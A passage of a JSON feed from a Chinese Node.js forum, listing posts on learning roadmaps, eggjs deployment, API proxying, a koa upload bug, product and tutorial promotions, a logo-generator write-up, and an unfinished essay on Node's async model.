href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/npm-deploy.md#npm-module-%E5%8F%91%E5%B8%83\">npm module 发布</a></li>\n<li><code>[NPM]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/npm-deploy.md#%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98\">可能遇到的问题</a></li>\n</ul>\n</li>\n<li><strong>Linux系统问题汇总</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/linux-question.md\">[more]</a></li>\n</ul>\n<h2>工具</h2>\n<ul>\n<li><strong>Git</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/tools/git.md\">[more]</a>\n<ul>\n<li><code>[Git]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/tools/git.md\">Git常用命令及日常问题集锦</a></li>\n</ul>\n</li>\n<li><strong>SEO</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/tools/seo.md\">[more]</a>\n<ul>\n<li><code>[SEO实战]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/tools/seo.md\">SEO网站优化title设置与快速排名</a></li>\n</ul>\n</li>\n</ul>\n<h2>资料</h2>\n<ul>\n<li><strong>书籍推荐</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/materials/book.md\">[more]</a></li>\n<li><strong>Blog推荐</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/materials/blog.md\">[more]</a></li>\n<li><strong>文章推荐</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/materials/article.md\">[more]</a></li>\n</ul>\n<p><strong>未完待续，持续更新中。。。</strong></p>\n</div>","title":"Node.js技术栈—侧重于服务端的学习指南","last_reply_at":"2019-05-07T03:46:38.207Z","good":false,"top":false,"reply_count":12,"visit_count":939,"create_at":"2019-05-05T05:00:43.856Z","author":{"loginname":"Q-Angelo","avatar_url":"https://avatars0.githubusercontent.com/u/17956058?v=4&s=120"}},{"id":"5cc7a14705ae566f637fdb44","author_id":"580f6fcab37ee8fb339787ea","tab":"ask","content":"<div class=\"markdown-text\"><p>之前服务端使用PHP写的，只有一个域名，前后端做了分离，现在部分新接口改用Java开发了，每个服务都有一个单独的域名</p>\n</div>","title":"请教一个问题，前端要从多个域名接口拿数据，一般是在前端进行配置还是写一个node服务中间层做所有的请求转发？","last_reply_at":"2019-05-07T02:43:51.303Z","good":false,"top":false,"reply_count":9,"visit_count":1101,"create_at":"2019-04-30T01:13:43.154Z","author":{"loginname":"lzq920","avatar_url":"https://avatars0.githubusercontent.com/u/37999725?v=4&s=120"}},{"id":"5cd05b4e5a5bae6e0781394a","author_id":"55d15035b25bd72150842db8","tab":"ask","content":"<div class=\"markdown-text\"><ol>\n<li>假如第一版已经上线运行，第二版要发布，重启服务的话不就断掉啦？是不是至少部署两台机器，然后用nginx去转发一下？有没有大神能提供一些实现细节</li>\n<li>单元测试是必写的吗？</li>\n<li><a href=\"https://github.com/papertiger8848/modelproxy\">https://github.com/papertiger8848/modelproxy</a> 类似这种的轻量级的接口配置建模框架，在eggjs里有没有更好的</li>\n</ol>\n</div>","title":"【部署上线】eggjs服务的疑问","last_reply_at":"2019-05-07T02:15:21.548Z","good":false,"top":false,"reply_count":5,"visit_count":210,"create_at":"2019-05-06T16:05:34.174Z","author":{"loginname":"luckymore","avatar_url":"https://avatars0.githubusercontent.com/u/5390013?v=4&s=120"}},{"id":"5cc41656a86ae80ce64b4aef","author_id":"5cc414eea86ae80ce64b4ae1","tab":"share","content":"<div class=\"markdown-text\"><p>更新加入支持编辑手机端网页的功能\n提供在线免费服务，可以编辑宣传页或者广告页~\n<a href=\"https://www.cxzweb.club/#/light-show/mRead/0.6051613123650894ppt\">手机版演示文稿</a>\n<a href=\"https://www.cxzweb.club/#/light-show/mEdit\">编辑器地址</a>  (注意，编辑器还是PC端打开使用)</p>\n<p>pc端在线demo:\nPC端在线演示文稿地址：<a href=\"https://www.cxzweb.club/#/light-show/read\">https://www.cxzweb.club/#/light-show/read</a>\nPC版编辑器地址： <a href=\"https://www.cxzweb.club/#/light-show/edit\">https://www.cxzweb.club/#/light-show/edit</a></p>\n<p>GitHub地址：<a href=\"https://github.com/Cxz-web/light-show\">https://github.com/Cxz-web/light-show</a>\n有小伙伴一起体验交流？ 后续会继续优化交互和完善更多的功能（有觉得功能不错的小伙伴给个Star支持鼓励下,谢谢O(∩_∩)O）。</p>\n</div>","title":"一个在线演示文稿工具， O(∩_∩)O，体验一波？","last_reply_at":"2019-05-07T01:55:59.052Z","good":false,"top":false,"reply_count":15,"visit_count":1579,"create_at":"2019-04-27T08:44:06.151Z","author":{"loginname":"Cxz-web","avatar_url":"https://avatars1.githubusercontent.com/u/39953676?v=4&s=120"}},{"id":"5ccfed4c5a5bae6e078136a2","author_id":"5902cd88782dbc4b183eceda","tab":"ask","content":"<div class=\"markdown-text\"><p>阿里云函数计算，是个诱人的服务，我们在试水。</p>\n<p>但是现在遇到webpack打包后，本地调试云函数时，找不到handler入口函数的问题</p>\n<p>有成功实践webpack打包后发布到云函数计算的吗？</p>\n</div>","title":"哪位大神实践过在阿里云函数计算中webpack打包发布","last_reply_at":"2019-05-07T01:50:10.250Z","good":false,"top":false,"reply_count":3,"visit_count":216,"create_at":"2019-05-06T08:16:12.955Z","author":{"loginname":"threem0126","avatar_url":"https://avatars0.githubusercontent.com/u/5511360?v=4&s=120"}},{"id":"5c98303afd41137eb76611c5","author_id":"5c8b07957ce0df37324281f2","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"https://www.bilibili.com/video/av47250164?from=search&amp;seid=5656787623889941077\">https://www.bilibili.com/video/av47250164?from=search&amp;seid=5656787623889941077</a></p>\n<p>Nodejs直播系统开发有人会吗?不知道 Nodejs搭建的直播系统性能怎么样?</p>\n</div>","title":"Nodejs直播系统开发有人会吗?B站已经有Nodejs实现（摄像机）监控直播管理系统","last_reply_at":"2019-05-07T01:46:28.917Z","good":false,"top":false,"reply_count":17,"visit_count":2897,"create_at":"2019-03-25T01:34:50.259Z","author":{"loginname":"xuemeifenglin","avatar_url":"https://avatars3.githubusercontent.com/u/48575523?v=4&s=120"}},{"id":"5cd0e0d2776fb66e0d172bb0","author_id":"5cac197b7edd13064e053b71","tab":"share","content":"<div class=\"markdown-text\"><p>ts是前端必备技能，此教程类 接口 泛型 泛型类、模块、装饰器都讲了，算是市面上最全的ts教程。 废话不多说 直接上地址。</p>\n<p><strong>2019年5月更新TypeScript入门实战教程B站地址:</strong></p>\n<p><a href=\"https://www.bilibili.com/video/av38379328/?p=1\">https://www.bilibili.com/video/av38379328/?p=1</a></p>\n<p><strong>2019年5月更新TypeScript入门实战教程百度网盘地址:</strong></p>\n<p><a href=\"https://pan.baidu.com/s/17jllW0igIOWjM3YCvWS-bg\">https://pan.baidu.com/s/17jllW0igIOWjM3YCvWS-bg</a></p>\n</div>","title":"2019年5月更新TypeScript入门实战教程-类 接口 泛型 泛型类 ts封装类似Mongoose的db库、装饰器-免费分享","last_reply_at":"2019-05-07T01:45:09.739Z","good":false,"top":false,"reply_count":1,"visit_count":114,"create_at":"2019-05-07T01:35:14.483Z","author":{"loginname":"xiaofenlin","avatar_url":"https://avatars3.githubusercontent.com/u/49425206?v=4&s=120"}},{"id":"5b7ac9c7c52ad1482eb940bf","author_id":"5b52cbf1fb9e84ec69cc1ca2","tab":"ask","content":"<div class=\"markdown-text\"><p>Egg.js现在用的人多吗？那些公司在用有知道的吗？</p>\n<p>同上，老铁们出来吧。</p>\n</div>","title":"Egg.js现在用的人多吗？那些公司在用有知道的吗？","last_reply_at":"2019-05-07T01:41:58.118Z","good":false,"top":false,"reply_count":107,"visit_count":12327,"create_at":"2018-08-20T14:01:43.981Z","author":{"loginname":"nodeper","avatar_url":"https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"}},{"id":"5ccd52a25a5bae6e07812b40","author_id":"5ccd522a776fb66e0d171b7c","tab":"ask","content":"<div class=\"markdown-text\"><p>router.post(’/upload’, multiparty({\nuploadDir: ‘./public/source’\n}), async(ctx, next) =&gt; {</p>\n<p>console.log(‘22’)\n**  无法打印出session**\nconsole.log(ctx.session)\nlet files = JSON.stringify(ctx.req.files)</p>\n<p>files = JSON.parse(files)\nconsole.log(files)</p>\n<p>})</p>\n</div>","title":"koa使用koa2-multiparty上传文件   session获取不到   求大佬解答","last_reply_at":"2019-05-07T01:28:22.506Z","good":false,"top":false,"reply_count":3,"visit_count":360,"create_at":"2019-05-04T08:51:46.702Z","author":{"loginname":"CHxtz","avatar_url":"https://avatars2.githubusercontent.com/u/37284580?v=4&s=120"}},{"id":"5cd0da52776fb66e0d172b53","author_id":"5831a35367db500b79c100f7","tab":"share","content":"<div class=\"markdown-text\"><p>通用企业应用接口管理系统（Common Enterprise Application interface Management System）为用户提供基于Node.js的云端微服务应用开发运维，以及API管理解决方案。</p>\n<p>CEAMS为云端微服务应用提供基于浏览器的在线一体化开发、调试、部署、监控管理、访问认证等能力。用户可在CEAMS系统上使用大量方便的云端服务应用的自动化开发和管理功能，例如自动化测试工具、代码和文档生成，零中断时间的一键升级和回滚应用版本，应用代码下载上传、版本比较等方便的功能。</p>\n<p>CEAMS系统由系统管理终端、应用开发管理网站及门户、以及高性能应用服务器三部分组成。系统为用户提供基于网页的统一在线应用门户中心，用户可在其中查看系统中部署的各类在线应用，同时提供对应用的分类和检索能力。CEAMS系统提供在线测试、浏览API文档、自动生成调用方接入代码等方便功能。</p>\n<p>统一的应用展示中心，用户可从中添加自己需要的服务资源：\n<img src=\"//static.cnodejs.org/FmuMOo6CLc4Lotb_XjI_NYDODvNr\" alt=\"统一的应用展示中心，用户可从中添加自己需要的服务资源\"></p>\n<p>自动生成清晰严谨API文档和API接入端代码，支持基于JSON Schema的数据校验：\n<img src=\"//static.cnodejs.org/Ftc5JJGJSqJuHSYmlS4_R1LxaF27\" alt=\"自动生成清晰严谨API文档和API接入端代码，支持基于JSON Schema的数据校验\"></p>\n<p>为方便开发，CEAMS系统为用户的云端应用提供统一的API规范，以及基于该规范的HTTP + JSON的API调用接口，可支持各类客户端，例如移动端app，企业后台应用等类型应用的接入。开发云端应用时，用户首先在平台上编辑并生成应用的API规范。CEAMS系统为云端微服务应用提供的统一API规范借鉴了部分UPnP规范的设计，可被看成是一个JSON版的WSDL规范。其中含有应用、应用中的服务列表，以及服务内部各个API的完整描述信息。基于该API规范，平台为应用提供各项方便的自动化能力，例如API文档、客户端接入代码自动生成、应用框架代码自动生成、基于JSON schema的严格数据校验能力、基于JSON schema form表单自动生成的API测试工具、灵活的API数据缓存和限流保护等能力。</p>\n<p>基于JSON Schema form自动输入表单生成能力的API测试工具：\n<img src=\"//static.cnodejs.org/Fv7xgtTHScmN4-O1dFphhlN_mYKf\" alt=\"基于JSON Schema form自动输入表单生成能力的API测试工具\"></p>\n<p>在CEAMS系统中，每个应用是一个标准的NPM包，可以对其添加任意开源第三方NPM依赖。在API规范编辑完成后，系统将自动为应用生成应用的框架代码，包含一个NPM包所需要的所有基础文件，以及API实现函数的入口等，开发者只需要编写函数的实现部分代码即可完成开发，而无需关心繁琐的HTTP协议实现，传参方法等。</p>\n<p>系统为开发者提供了基于Web IDE的线上开发环境，可支持多用户同时在线开发。用户可以在在浏览器中，线上完成应用的开发、调试、和部署，而无需重复代码在本地开发测试，线上部署的繁琐过程。得益于CDIF应用服务器提供的热更新能力，应用从启动调试到完成部署仅需数十秒即可完成。同时，系统也支持在VSCode等流行的IDE中完成应用的线下开发调试，并通过NPM压缩包格式一键上传到系统中并部署。</p>\n<p>基于浏览器的云端开发环境，支持多人同时在线开发调试，Web Terminal和Node.js REPL：\n<img src=\"//static.cnodejs.org/Fus7E2QmUJNCxmAuJ-5J9M7yTJfq\" alt=\"基于浏览器的云端开发环境，支持多人同时在线开发调试，Web Terminal和Node.js REPL\"></p>\n<p>系统提供完整的Node.js NPM生态支持（<a href=\"https://www.npmjs.com\">https://www.npmjs.com</a>），用户可自由引用NPM生态中70多万个各类开源包中的任意一个，例如各类工具库、数据库驱动，消息中间件接口等，帮助方便地开发其云端应用和对接到各类异构系统资源。为方便使用，CEAMS系统为用户提供了免费的国内高速NPM镜像，内置了常用的数千个NPM包资源，并可实时自动更新版本和添加更多第三方开源NPM包。同时，系统内置了对各类常用协议，例如对REST API、SOAP等的支持，可帮助应用开发者方便地连接并从其他系统获取应用开发需要的数据和能力。</p>\n<p>CEAMS系统已支持Node.js最新版本带来的多线程能力。在多线程模式下，每个应用部署于独立的worker线程中，并具备单独的线程上下文和堆空间，执行高CPU占用率任务时不会阻塞其他应用的执行。同时适用于I/O密集型与CPU密集型任务，如API网关和数据计算处理等。CEAMS系统的应用服务器可无缝地随时在传统的单线程和新的多线程模式下切换，对已部署的应用毫无感知。</p>\n<p>应用服务器同时提供Node.js单线程和多线程运行模式，并可指定扩容实例个数：\n<img src=\"//static.cnodejs.org/FlNUNg68sL-pNaHYNFMmtsssEI7z\" alt=\"应用服务器同时提供Node.js单线程和多线程模式，并可指定应用服务器扩容实例数量\"></p>\n<p>更进一步，基于CDIF应用服务器为应用提供的统一JSON数据接口，在获得相应的应用访问权限后，用户可使用纯粹JSON 数据格式调用系统中部署的其他应用，而不需要增加REST API特有的与HTTP相关的代码（例如GET, POST，传参方法等等）。通过灵活地组织和处理来自不同应用的JSON 数据，并使用lodash、JSON path等高效的数据转换和查询工具，配合async等异步并发流程控制组件，组织出复杂、高性能的组合微服务应用逻辑和工作流程场景。</p>\n<p>为帮助用户使用，CEAMS系统封装了Node.js多线程API，为不同应用线程之间的数据相互调用提供了高性能的异步消息接口，并且在单线程模式和多线程模式下完全统一。用户无需理解和使用繁杂的Node.js多线程API，或基于Cluster的多进程模型。只需要在应用的任何位置添加几行代码，创建对任意服务应用的客户端对象，并根据该服务应用提供的JSON API规范，即可完成和该服务应用之间的数据对接。</p>\n<p>CEAMS系统已被成功应用于国内省级警务云平台建设，以及其他多个政企项目中，并稳定运行至今。我们在期间从未收到过一次故障崩溃报告。</p>\n<p>目前，我们已为CEAMS系统已提供社区版免费下载，社区版包含了系统的全部功能，可以满足中小规模应用场景。用户可以通过bash安装脚本，在常用的Linux操作系统上一键下载、安装和启动整个系统。以下是CEAMS产品的下载连接，其中包含了系统的下载安装方法、用户手册、开发指南等文档：</p>\n<p><a href=\"https://www.apemesh.com/cn/download\">CEAMS系统下载连接</a></p>\n<p>如果您对CEAMS系统的使用有任何问题，欢迎您邮件至：support@apemesh.com，或者加入灵长科技技术支持QQ群：618450152 向我们询问和了解。</p>\n</div>","title":"CEAMS: 基于Node.js的高效微服务应用开发运维和API管理系统提供免费下载使用","last_reply_at":"2019-05-07T01:07:30.793Z","good":false,"top":false,"reply_count":0,"visit_count":115,"create_at":"2019-05-07T01:07:30.793Z","author":{"loginname":"out4b","avatar_url":"https://avatars2.githubusercontent.com/u/13964618?v=4&s=120"}},{"id":"5cd0162d5a5bae6e07813834","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FgUggHAIOwyOUF2qy6xgsS7nsiks\" alt=\"image.png\"></p>\n<p>每天更新外包资源，尽在微信小程序：小猿众包 。扫一扫</p>\n<p><img src=\"//static.cnodejs.org/FvdVcZiXziCn000KpsP3ha7TJsX_\" alt=\"image.png\"></p>\n<p>可以加官方微信群：\n<img src=\"//static.cnodejs.org/Fmbw-S1GjdL2_pLzeUlfv98--DNv\" alt=\"image.png\"></p>\n</div>","title":"有没有朋友接私活，报酬 5万-10万","last_reply_at":"2019-05-07T00:59:08.733Z","good":false,"top":false,"reply_count":4,"visit_count":453,"create_at":"2019-05-06T11:10:37.253Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5cd0490b776fb66e0d172aa3","author_id":"4f50e82198766f5a610bbaff","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://note.youdao.com/ynoteshare1/index.html?id=5b4084bf0dd4e456cf7c813eec4b7d6a&amp;type=note\">https://note.youdao.com/ynoteshare1/index.html?id=5b4084bf0dd4e456cf7c813eec4b7d6a&amp;type=note</a></p>\n</div>","title":"前端如何做excel表格的导出","last_reply_at":"2019-05-07T00:29:22.312Z","good":false,"top":false,"reply_count":1,"visit_count":169,"create_at":"2019-05-06T14:47:39.701Z","author":{"loginname":"151263","avatar_url":"//gravatar.com/avatar/595ec965d51c7e3c6a7d1e8eb177dd8d?size=48"}},{"id":"5c1c425c76c4964062a1c0ef","author_id":"5c1c411f76c4964062a1c0e3","tab":"share","content":"<div class=\"markdown-text\"><p>推荐一个前端导航网站，记录了各种关于前端的网址，可以直接在对应社区查找问题。\n喜欢的话赶快收藏一波吧 ^^\n网站地址： <strong><a href=\"https://www.frontendjs.com/\">https://www.frontendjs.com/</a></strong></p>\n<p><img src=\"//static.cnodejs.org/Fk1zwq8EO9Ugzovv-D1T5-GUnuIy\" alt=\"3898986698-5c05daee066b9_articlex.png\"></p>\n</div>","title":"前端导航网址分享，觉得有帮助的可以收藏下","last_reply_at":"2019-05-07T00:24:49.338Z","good":false,"top":false,"reply_count":16,"visit_count":2298,"create_at":"2018-12-21T01:31:08.779Z","author":{"loginname":"bestvist","avatar_url":"https://avatars2.githubusercontent.com/u/22828569?v=4&s=120"}},{"id":"5b7f8a2c944cb8340c27e335","author_id":"5b72f6727271129a2f32a97f","tab":"share","content":"<div class=\"markdown-text\"><p>2018年Nodejs Koa2 Typescript Eggjs Vue2最新教程资源网盘分享：\n<a href=\"https://pan.baidu.com/s/1O2C6TolDzYpMnKIfQaaqog\">Nodejs视频教程</a>\n<a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\">Koa2教程</a>\n<a href=\"https://pan.baidu.com/s/17jllW0igIOWjM3YCvWS-bg\">6月Typescript教程</a>\n<a href=\"https://pan.baidu.com/s/1a8-RY-aBm3YkH2ZqJKmztg\">8月Eggjs视频教程</a>\n需要更多学习资源可留下邮箱，有的就分享</p>\n</div>","title":"2018年Nodejs Koa2 Typescript Eggjs Vue2最新教程资源网盘分享","last_reply_at":"2019-05-06T14:03:09.111Z","good":false,"top":false,"reply_count":42,"visit_count":7362,"create_at":"2018-08-24T04:31:40.973Z","author":{"loginname":"chengl123","avatar_url":"https://avatars3.githubusercontent.com/u/42384077?v=4&s=120"}},{"id":"5cd0393c776fb66e0d172a5c","author_id":"55d15035b25bd72150842db8","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fqsitokl6-Z9q2eBZyhoMOYvAZBi\" alt=\"image.png\"></p>\n</div>","title":"计算机语言的性能指标都是啥意思？","last_reply_at":"2019-05-06T13:40:12.297Z","good":false,"top":false,"reply_count":0,"visit_count":130,"create_at":"2019-05-06T13:40:12.297Z","author":{"loginname":"luckymore","avatar_url":"https://avatars0.githubusercontent.com/u/5390013?v=4&s=120"}},{"id":"5c976feefd41137eb7660fca","author_id":"57f2384783a4d9176a71da75","tab":"share","content":"<div class=\"markdown-text\"><h2>TL；DR</h2>\n<p><a href=\"http://Logoly.Pro\">Logoly.Pro</a> 是一个在线的 PornHub 风格 Logo 生成工具，可以帮助你快速生成类似 PornHub 风格的 Logo</p>\n<p><img src=\"https://i.loli.net/2019/03/24/5c976fdcf01a8.png\" alt></p>\n<p>目前项目已经上线：<a href=\"https://logoly.pro/\">https://logoly.pro/</a>\n代码也已开源：<a href=\"https://github.com/bestony/logoly\">https://github.com/bestony/logoly</a></p>\n<p><strong>欢迎各位前来试用 &amp;&amp; 求 Star !</strong></p>\n<hr>\n<p>昨晚，我花了 5 个小时，在肝一个项目，如今，让他成功上线，我便向大家介绍一下他。</p>\n<h2>突发的灵感</h2>\n<p>我自己平时经常要做一些 Side Project ，在做 Side Project 的时候，就涉及到了要做 Logo ，但是作为一个没有设计感的程序员，在做 Logo 时总是会做出一些很丑的 Logo ，于是痛定思痛，想想有没有什么有用的工具可以帮助我生成好看的 Logo。对于我来说，也不需要太过复杂，能够满足我自己的要求就行。</p>\n<p>那么这就要求这个 Logo 有一些特点</p>\n<ol>\n<li><strong>设计简单</strong>：很多带吉祥物的 Logo 就不适合我了，因为要去准备吉祥物的图片。</li>\n<li><strong>辨识度高</strong>：单纯的简单并没有太多的用处， Logo 需要让用户能够记住</li>\n</ol>\n<p>经过一番筛选，PornHub 的 Logo 进入到我的视线。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/24/169adc89cb1d0857?w=926&amp;h=312&amp;f=png&amp;s=16159\" alt></p>\n<h2>设计产品</h2>\n<p>在开发之前，我先进行了产品方面的考虑，看看我需要做哪些功能，哪些不做，最终得到了这样一个清单：</p>\n<p><strong>要做的项目</strong></p>\n<ol>\n<li><strong>项目使用 Vue 开发</strong>，因为可以快速上线</li>\n<li><strong>项目使用 Netlify 部署</strong>，这样就可以使用自己的域名，并使用 SSL，速度还要比 Github Pages 快一些。</li>\n<li><strong>项目应当支持自定义文字</strong>，这个是最基础的功能需求，必须要做的。</li>\n<li><strong>项目应当支持自定义颜色</strong>，毕竟可能有其他的方面，需要类似风格，但是不同的颜色的 Logo</li>\n<li><strong>项目应当支持自定义文字大小</strong>，毕竟我导出的是 PNG，如果不能自定义大小，大家可能会很困扰。</li>\n<li><strong>项目应当加入 Google Analytics</strong>，加入统计，就知道有多少人用过我的项目了，也是一种成就感。</li>\n<li><strong>项目应当加入我的个人信息，用来给我自己推广</strong>，顺便刷一波脸。</li>\n<li><strong>社会化分享</strong>，应当有个方便的分享方法，这样才能够更好的帮助项目在前期成长。</li>\n</ol>\n<p><strong>不做的项目</strong></p>\n<ol>\n<li><strong>自定义字体</strong>：原汁原味的 PH 风格，怎能瞎改字体呢？</li>\n<li><strong>导出 JPG</strong>： 有了透明背景的 PNG，不透明的 JPG 的需求就没那么大了。</li>\n</ol>\n<p><strong>后续迭代实现的</strong></p>\n<ol>\n<li><strong>其他简单的 Logo</strong>：比如 Youtube.</li>\n</ol>\n<h2>设计布局</h2>\n<p>在完成了产品的功能，我又进行了布局的设计，这次我用的是 Adobe XD，最近很喜欢用这个工具来设计产品的界面，非常的方便。最终设计完成的版本如下：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/24/169adc89ca709b11?w=1920&amp;h=1700&amp;f=png&amp;s=70050\" alt></p>\n<p>设计完成后，就要开始准备开始编码了。</p>\n<h2>找库</h2>\n<p>一开始，我考虑使用一些 UI Framework ,不过，由于一开始没有引入 UI Framework， 快写完了才发现基本不需要组件库，干脆将错就错，这样用了。</p>\n<p>在完成了基本的界面后，就是涉及到的一些库的使用了，这里要感谢前端生态圈的繁荣，我从 <a href=\"https://picas.now.sh/\">Picas</a> 和 <a href=\"https://carbon.now.sh/\">Carbon</a> 的源码里找到了我想要用的库。</p>\n<ul>\n<li><strong>dom-to-image</strong>: 将 Dom 元素转换成为图片，以备下载。</li>\n<li><strong>file-save</strong>: 在 Vue 组件里调用系统的下载接口，下载图片</li>\n</ul>\n<p>其他我用到的库还有</p>\n<ul>\n<li><strong>v-tooltips</strong>:  用户提醒，之前用的 Vue-Tour,但是跳跃感太强了，所以弃用了。</li>\n<li><strong>vue-analytics</strong>： Vue 下的 Google Analytics 工具，可以很方便的调用 GA 进行统计。</li>\n</ul>\n<h2>上线</h2>\n<p>在完成了开发后，将代码上传到 Github，准备部署。</p>\n<p>在前面提到，我考虑用 Netlify 进行部署，这里非常方便，在 Netlify 上直接创建项目，选择你的项目，然后填入命令即可。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/24/169adc89c9c670f2?w=684&amp;h=379&amp;f=png&amp;s=21910\" alt></p>\n<p>并配置一下域名，将自己的域名设置为主域名</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/24/169adc89f111c20c?w=910&amp;h=594&amp;f=png&amp;s=32967\" alt></p>\n<p>稍等一会，就会自动为你的域名签注 Let’s Encrypt 的证书。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/24/169adc89cb521df8?w=926&amp;h=623&amp;f=png&amp;s=40176\" alt></p>\n<h2>最后</h2>\n<p>关于这个项目的故事，我已经说完了所有我能想到的了，接下来，就是你的提问时间了，欢迎你针对项目对我提问，无论是产品、设计、编码，都可以~</p>\n<p><strong>希望大家能够给这个项目一个 Star: <a href=\"https://github.com/bestony/logoly\">https://github.com/bestony/logoly</a></strong></p>\n</div>","title":"正经的我，做了个不正经的项目 —— Pornhub 风格 Logo 生成器","last_reply_at":"2019-05-06T13:29:03.270Z","good":false,"top":false,"reply_count":18,"visit_count":3766,"create_at":"2019-03-24T11:54:22.582Z","author":{"loginname":"bestony","avatar_url":"https://avatars1.githubusercontent.com/u/13283837?v=4&s=120"}},{"id":"5c1c9ab676c4964062a1c3e1","author_id":"5372465f3c72496d41009adc","tab":"share","content":"<div class=\"markdown-text\"><p>《Node.js开发实战》原书排名并发编程类榜首。有读者坐火车十小时一口气读完，欲罢不能！好不好，试读就知道。</p>\n<p><strong>62页试读下载</strong>：<a href=\"https://pan.baidu.com/s/1x3c35AmJV4rcEj_W3A1WGg\">https://pan.baidu.com/s/1x3c35AmJV4rcEj_W3A1WGg</a></p>\n<p><strong>读者热评</strong>：</p>\n<ul>\n<li>看的欲罢不能啊，火车上来回十个小时，把整体内容浏览了一遍，然后现在精读到第二张，发现学到了好多东西，好书。\n——京东读者 小***土</li>\n</ul>\n<ul>\n<li>粗略的看了一遍,准备细读一下,很多地方给详细讲了es6的新特性,包括let、const、还有class和promise,还讲解了async和await,反正不太需要有es6基础也能看得懂,不过都要2019了,其实这些应该是前端必备技能了吧.书写的很好,循序渐进,感觉前端在没搞懂node之前,其实并不需要去学py啊php啊之类的,语言毕竟只是工具,利用工具做事情的理念是想通的.(最后这句说给我自己的)\n——豆瓣读者 陈小土</li>\n</ul>\n<ul>\n<li>很不错的一本关于node的实战书！\n——京东读者 f***8</li>\n</ul>\n<ul>\n<li>内容由浅入深，引人入胜。\n——京东读者 d***t</li>\n</ul>\n<p><strong>京东有售</strong>：<a href=\"https://item.jd.com/12460185.html\">https://item.jd.com/12460185.html</a></p>\n<p><img src=\"//static.cnodejs.org/Finp2H7di-Equ_yMWsjJY6hxYGkh\" alt=\"WechatIMG148 copy.jpg\"></p>\n</div>","title":"新书《Node.js开发实战》抢鲜试读","last_reply_at":"2019-05-06T11:34:55.214Z","good":false,"top":false,"reply_count":21,"visit_count":4278,"create_at":"2018-12-21T07:48:06.079Z","author":{"loginname":"meikidd","avatar_url":"https://avatars0.githubusercontent.com/u/376338?v=4&s=120"}},{"id":"5ccfecad776fb66e0d1727b1","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>很多人质疑node的高并发优势，并且以输出HelloWorld或输出计算结果来和传统的Java对比证明node并没有web的高并发优势，但事实真的是这样么？为什么说只输出HelloWorld性能还是比不过传统Java？异步是否还难道是不如多线程？</p>\n<p>尤其是对于node的高并发优势，很多人却说的很模糊，所以我觉得是时候以更通俗的语言和更接近Web编程的实际场景来解释异步模型的优势。</p>\n<h1>先讲个小故事</h1>\n<p>C是建筑工，Q是搬运工，Y是包工头。</p>\n<p>故事一:第一天C建墙建了一天发现没砖了，C告诉包工头Y没砖了，于是Y通知Q去搬点砖来，结果Q搬砖搬了一天，C就休息了一天。后来C建了一天屋顶又发现没瓦了,C告诉包工头Y没瓦了，于是Y通知Q再去搬点瓦来，结果Q搬瓦搬了一天，C就又休息了一天。后来C建了一天窗户又发现没玻璃了，C告诉包工头Y没玻璃了，于是Y通知Q再去搬点玻璃来，结果Q搬玻璃搬了一天，C就又休息了一天。后来C建了一天电路又发现没电线了，C告诉包工头Y没电线了，于是Y通知Q再去搬点电线来，结果Q搬电线搬了一天，C就又休息了一天。以此类推，最终导致工期没有按时完成，Y被处分了。</p>\n<p>故事二:吸取了故事一的教训，Y扩充了三倍团队人数。C1,C2,C3一起来建房子。结果C1,C2,C3都没有砖了，C1,C2,C3告诉Y，Y于是叫Q1，Q2，Q3去搬砖。同样Q1,Q2,Q3搬砖搬了一天，C1,C2,C3就休息了一天，和上面差不多都出现了搬瓦搬玻璃电线等等事件，但由于人多，建的速度快，还好没延期，但多招了很多人，Y亏本破产了。</p>\n<p>故事三:吸取了故事二的教训，Y决定弄个排期表还是不能让C闲着，当C建了一天墙发现没砖了后，Y让Q把砖搬回来的同时也让C先建设一天屋顶。正好C发现没瓦后，正好S的砖也搬回来了，C又可以去建墙，同时S又可以去拉瓦。当瓦拉回来后，C又可以建屋顶了。以此类推，最终工期按时完成，同时Y也赚到盆满钵满。</p>\n<p>故事一就是传统的单线程阻塞模式，故事二就是多线程的阻塞模式，故事三就是非阻塞的异步模式。而C就是CPU，C休息就是CPU空转。Q就是查询，Q搬东西就是查询需要等待的时间。C1,C2,C3的工资就是开线程的成本。Y就是你，你就是包工头。所以非阻塞的异步模式，主要解决了两个问题：</p>\n<ul>\n<li>解决了CPU空转大量浪费问题</li>\n<li>节约了开线程和线程切换上下文的成本问题</li>\n</ul>\n<h1>再谈什么情况能超越传统Java</h1>\n<p>根据上面的情况，无论是只输出HelloWorld也好，进行少量计算也好，这都是无需等待的操作，相当于上面那个故事里面的砖从来没有缺过的情况，但是一旦涉及到需要阻塞的等待，那么node的异步模式将起了极大的作用，而Web编程这种需要阻塞的等待又是极多的，比如说查询。</p>\n<p>我将用一段Java和node的等待操作进行压测来证明我的所说的情况。</p>\n<p>